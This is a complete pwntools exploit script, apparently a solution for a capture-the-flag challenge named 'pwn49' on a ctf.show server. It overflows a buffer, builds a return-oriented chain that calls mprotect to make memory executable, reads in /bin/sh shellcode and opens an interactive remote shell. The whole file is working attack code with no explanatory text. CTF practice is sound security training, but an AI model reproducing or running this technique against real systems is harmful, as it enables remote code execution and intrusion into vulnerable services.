from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
io = remote('pwn.challenge.ctf.show',28263)
elf =ELF('pwn49')
mprotect = elf.symbols['mprotect']
read=0x0806BEE0
pop_ebx_esi_ebp_ret =0x080a019b 
addr=0x080DA000
size=0x2000
proc=0x7
payload=cyclic(0x12+4)+p32(mprotect)
payload+=p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(size)+p32(proc)+p32(read)+p32(pop_ebx_esi_ebp_ret)+p32(0)+p32(addr)+p32(size)+p32(addr)
io.sendline(payload)
shellcode = asm(shellcraft.sh())
io.send(shellcode) #用于生成一个执行/bin/sh
io.recv()
io.interactive()